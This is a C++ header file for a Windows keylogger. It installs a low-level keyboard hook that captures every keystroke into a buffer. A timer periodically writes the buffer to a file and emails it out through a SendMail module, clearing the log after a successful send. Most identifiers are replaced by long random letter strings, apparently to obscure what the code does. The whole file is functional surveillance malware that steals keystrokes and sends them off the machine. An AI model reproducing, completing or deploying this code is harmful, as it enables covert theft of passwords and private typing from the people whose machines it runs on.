#ifndef KEYHOOK_H
#define KEYHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

std::string ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu = "";

void ARiARiARjARjASjASjBSjBSjBSkBSkBTkBTk()
{
    if(ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu.empty())
        return;
    std::string ARjBTkCUmDVnFWoGYpHZrIasKbtLduMewNfxP = IO::AQgwNdtKaqGXnDUkAQhxNeuKbrHXoEUlBR(ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu);

    if(ARjBTkCUmDVnFWoGYpHZrIasKbtLduMewNfxP.empty())
    {
        Helper::ANaoBOcpCQdqERfsFTgtHUhvIWjw("File creation was not succesfull. Keylog '" + ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu + "'");
        return;
    }

    int x = Mail::SendMail("Log [" +ARjBTkCUmDVnFWoGYpHZrIasKbtLduMewNfxP+ "]", "Hi :) \nThe file has been attached to this mail :) \nFor testing, enjoy: \n" + ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu, IO::AOcrFUixLaoDRfuIXlAOdrGUjxLaoD(true) + ARjBTkCUmDVnFWoGYpHZrIasKbtLduMewNfxP);

    if(x != 7)
    {
        Helper::ANaoBOcpCQdqERfsFTgtHUhvIWjw("Mail was not sent! Error code: " + Helper::AOcqESguIWkzNbpDRftHVjyMaoCQes(x));
    }
    else
    {
        ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu = "";
    }
}

Timer ASkDVoGZrKcvNgyRjCUnFYqJbuMfxQiBTmEXpI(ARiARiARjARjASjASjBSjBSjBSkBSkBTkBTk, 500 * 60, Timer::Infinite);

HHOOK ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode < 0)
        CallNextHookEx(ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo, nCode, wparam, lparam);
    KBDLLHOOKSTRUCT *ATmFYsLexRkDWpJcvOiBUnGatMfzSlEXrKdwQjCV = (KBDLLHOOKSTRUCT *)lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu += Keys::KEYS[ATmFYsLexRkDWpJcvOiBUnGatMfzSlEXrKdwQjCV->vkCode].Name;
        if(ATmFYsLexRkDWpJcvOiBUnGatMfzSlEXrKdwQjCV->vkCode == VK_RETURN)
            ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu += "\n";
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = ATmFYsLexRkDWpJcvOiBUnGatMfzSlEXrKdwQjCV->vkCode;
        if(key == VK_CONTROL
                || key == VK_LCONTROL
                || key == VK_RCONTROL
                || key == VK_SHIFT
                || key == VK_RSHIFT
                || key == VK_LSHIFT
                || key == VK_MENU
                || key == VK_LMENU
                || key == VK_RMENU
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
                || key == VK_RWIN
        )
        {
            std::string KeyName = Keys::KEYS[ATmFYsLexRkDWpJcvOiBUnGatMfzSlEXrKdwQjCV->vkCode].Name;
            KeyName.insert(1, "/");
            ASkCUmEWoHZrJbtLdwOgyQiASlDVnFXpHasKcu += KeyName;
        }
    }

    return CallNextHookEx(ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo, nCode, wparam, lparam);
}

bool ATnGatNhAUnHbuOhBVoIbvOiCVpIcwPjCWqJdwQjD()
{
    Helper::ANaoBOcpCQdqERfsFTgtHUhvIWjw("Hook Started... Timer started");
    ASkDVoGZrKcvNgyRjCUnFYqJbuMfxQiBTmEXpI.Start(true);

    ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                            GetModuleHandle(NULL), 0);

    return ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx (ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo);
    ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(ASlEXqJbuNgzSlDWpIbuNfyRkDWpHatMfyRjCVo == NULL);
}



#endif // KEYHOOK_H
